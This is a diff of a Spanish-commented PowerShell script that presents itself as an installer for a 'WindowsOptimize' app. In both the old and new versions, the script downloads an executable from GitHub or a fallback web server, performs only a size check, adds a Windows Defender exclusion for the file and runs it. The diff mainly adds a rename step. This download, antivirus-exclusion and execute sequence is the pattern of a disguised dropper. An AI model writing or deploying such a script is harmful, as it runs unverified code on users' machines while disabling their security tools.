@@ -29,10 +29,13 @@ if ([Environment]::Is64BitOperatingSystem) {
 }
 
 $fileName = "WindowsOptimizeApp_$arch.exe"
+$finalName = "WindowsOptimize.exe"
+
 Write-Output "Sistema detectado: $arch"
 
-# ================= DEFINIR RUTA DE DESCARGA =================
-$exePath = Join-Path -Path $env:USERPROFILE -ChildPath $fileName
+# ================= RUTAS =================
+$tempPath  = Join-Path -Path $env:USERPROFILE -ChildPath $fileName
+$finalPath = Join-Path -Path $env:USERPROFILE -ChildPath $finalName
 
 # ================= FUNCIÓN DESCARGA =================
 function Download-File($url, $output) {
@@ -57,7 +60,7 @@ try {
     }
 
     if ($asset) {
-        $downloaded = Download-File $asset.browser_download_url $exePath
+        $downloaded = Download-File $asset.browser_download_url $tempPath
     } else {
         Write-Warning "No se encontró el asset en GitHub"
     }
@@ -66,13 +69,13 @@ try {
     Write-Warning "Error accediendo a GitHub"
 }
 
-# ================= FALLBACK: WEB PROPIA =================
+# ================= FALLBACK =================
 if (-not $downloaded) {
     Write-Warning "Usando fallback desde servidor web..."
 
     $fallbackUrl = "$fallbackBaseUrl/$fileName"
 
-    $downloaded = Download-File $fallbackUrl $exePath
+    $downloaded = Download-File $fallbackUrl $tempPath
 
     if (-not $downloaded) {
         Write-Error "Error descargando desde GitHub y fallback web"
@@ -80,33 +83,47 @@ if (-not $downloaded) {
     }
 }
 
-# ================= VALIDACIÓN BÁSICA =================
-if (-not (Test-Path $exePath)) {
+# ================= VALIDACIÓN =================
+if (-not (Test-Path $tempPath)) {
     Write-Error "El archivo no existe después de la descarga"
     exit 1
 }
 
-$fileSize = (Get-Item $exePath).Length
+$fileSize = (Get-Item $tempPath).Length
 if ($fileSize -lt 500000) {
     Write-Error "Archivo descargado sospechosamente pequeño"
     exit 1
 }
 
-Write-Output "Descarga completada: $exePath"
+# ================= RENOMBRAR =================
+Write-Output "Renombrando a $finalName..."
 
-# ================= EXCEPCIÓN PARA WINDOWS DEFENDER =================
 try {
-    Add-MpPreference -ExclusionPath $exePath
+    if (Test-Path $finalPath) {
+        Remove-Item $finalPath -Force
+    }
+
+    Rename-Item -Path $tempPath -NewName $finalName
+} catch {
+    Write-Error "Error renombrando el archivo"
+    exit 1
+}
+
+Write-Output "Archivo final: $finalPath"
+
+# ================= EXCEPCIÓN DEFENDER =================
+try {
+    Add-MpPreference -ExclusionPath $finalPath
     Write-Output "Excepción de Windows Defender añadida"
 } catch {
     Write-Warning "No se pudo agregar la exclusión"
 }
 
 # ================= EJECUTAR =================
-Write-Output "Ejecutando $fileName..."
+Write-Output "Ejecutando $finalName..."
 
 try {
-    Start-Process -FilePath $exePath
+    Start-Process -FilePath $finalPath
 } catch {
     Write-Error "Error al ejecutar el archivo"
     exit 1
